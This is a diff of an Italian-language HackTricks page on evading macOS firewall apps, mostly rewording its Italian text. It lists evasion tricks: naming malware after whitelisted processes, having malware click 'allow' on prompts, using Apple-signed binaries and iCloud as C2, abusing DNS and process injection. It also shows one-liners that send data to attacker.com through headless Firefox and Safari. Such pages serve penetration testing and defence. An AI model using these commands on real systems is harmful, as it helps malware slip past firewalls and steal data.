@@ -1,16 +1,16 @@
-# Bypassing dei firewall di macOS
+# macOS Bypassing Firewalls
 
 {% hint style="success" %}
-Impara e pratica l'Hacking su AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Impara e pratica l'Hacking su GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>Sostieni HackTricks</summary>
+<summary>Support HackTricks</summary>
 
-* Controlla i [**piani di abbonamento**](https://github.com/sponsors/carlospolop)!
-* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Condividi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repository di Github.
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
 {% endhint %}
@@ -19,39 +19,39 @@ Impara e pratica l'Hacking su GCP: <img src="/.gitbook/assets/grte.png" alt="" d
 
 Le seguenti tecniche sono state trovate funzionanti in alcune app firewall di macOS.
 
-### Abuso dei nomi nella whitelist
+### Abusare dei nomi nella whitelist
 
-* Ad esempio chiamare il malware con nomi di processi macOS ben noti come **`launchd`**
+* Ad esempio, chiamare il malware con nomi di processi macOS ben noti come **`launchd`**
 
 ### Click sintetico
 
-* Se il firewall chiede il permesso all'utente, fare in modo che il malware **clicchi su consenti**
+* Se il firewall chiede il permesso all'utente, far **cliccare su consenti** al malware
 
-### **Utilizzare binari firmati da Apple**
+### **Usa binari firmati da Apple**
 
 * Come **`curl`**, ma anche altri come **`whois`**
 
 ### Domini Apple ben noti
 
-Il firewall potrebbe consentire connessioni a domini Apple ben noti come **`apple.com`** o **`icloud.com`**. E iCloud potrebbe essere utilizzato come C2.
+Il firewall potrebbe consentire connessioni a domini Apple ben noti come **`apple.com`** o **`icloud.com`**. E iCloud potrebbe essere usato come C2.
 
 ### Bypass generico
 
-Alcune idee per cercare di bypassare i firewall
+Alcune idee per provare a bypassare i firewall
 
-### Controllare il traffico consentito
+### Controlla il traffico consentito
 
-Conoscere il traffico consentito ti aiuterà a identificare potenzialmente i domini presenti nella whitelist o le applicazioni autorizzate ad accedervi
+Conoscere il traffico consentito ti aiuterà a identificare potenziali domini in whitelist o quali applicazioni sono autorizzate ad accedervi.
 ```bash
 lsof -i TCP -sTCP:ESTABLISHED
 ```
-### Abuso del DNS
+### Abusare di DNS
 
-Le risoluzioni DNS vengono effettuate tramite l'applicazione firmata **`mdnsreponder`** che probabilmente sarà autorizzata a contattare i server DNS.
+Le risoluzioni DNS vengono eseguite tramite l'applicazione firmata **`mdnsreponder`** che probabilmente sarà autorizzata a contattare i server DNS.
 
 <figure><img src="../../.gitbook/assets/image (468).png" alt="https://www.youtube.com/watch?v=UlT5KFTMn2k"><figcaption></figcaption></figure>
 
-### Tramite app del Browser
+### Tramite app del browser
 
 * **oascript**
 ```applescript
@@ -78,9 +78,9 @@ firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
 ```bash
 open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
 ```
-### Attraverso l'iniezione di processi
+### Via iniezioni di processi
 
-Se riesci a **iniettare codice in un processo** che è autorizzato a connettersi a qualsiasi server, potresti eludere le protezioni del firewall:
+Se puoi **iniettare codice in un processo** che è autorizzato a connettersi a qualsiasi server, potresti bypassare le protezioni del firewall:
 
 {% content-ref url="macos-proces-abuse/" %}
 [macos-proces-abuse](macos-proces-abuse/)
@@ -91,8 +91,8 @@ Se riesci a **iniettare codice in un processo** che è autorizzato a connettersi
 * [https://www.youtube.com/watch?v=UlT5KFTMn2k](https://www.youtube.com/watch?v=UlT5KFTMn2k)
 
 {% hint style="success" %}
-Impara e pratica l'Hacking su AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Impara e pratica l'Hacking su GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Impara e pratica il hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Impara e pratica il hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
@@ -100,7 +100,7 @@ Impara e pratica l'Hacking su GCP: <img src="/.gitbook/assets/grte.png" alt="" d
 
 * Controlla i [**piani di abbonamento**](https://github.com/sponsors/carlospolop)!
 * **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Condividi trucchi di hacking inviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).
+* **Condividi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos su github.
 
 </details>
 {% endhint %}
